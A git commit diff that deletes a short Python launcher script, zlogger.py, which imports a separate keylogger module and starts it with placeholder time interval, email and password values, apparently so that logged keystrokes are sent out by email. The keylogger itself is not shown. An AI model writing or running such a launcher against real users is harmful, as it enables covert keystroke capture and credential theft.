4df682bc88c04cf7d73af29113832a8b77dfd2ab
PythonHacker <72488360+PythonHacker24@users.noreply.github.com>
2023-01-26 13:19:38 +0530

    Delete #!/usr directory

--- #!/usr/zlogger.py
+++
@@ -1,6 +0,0 @@
-#!/usr/share/python3
-
-import keylogger          # calling the keylogger script that was written earlier
-
-my_keylogger = keylogger.Keylogger(<time_interval>, "<email>", "<password>")        # keylogger was the script name and Keylogger was the class name
-my_keylogger.start()                        # my_keylogger has the instance of keylogger.Keylogger() and the start is the method that we are calling from the class
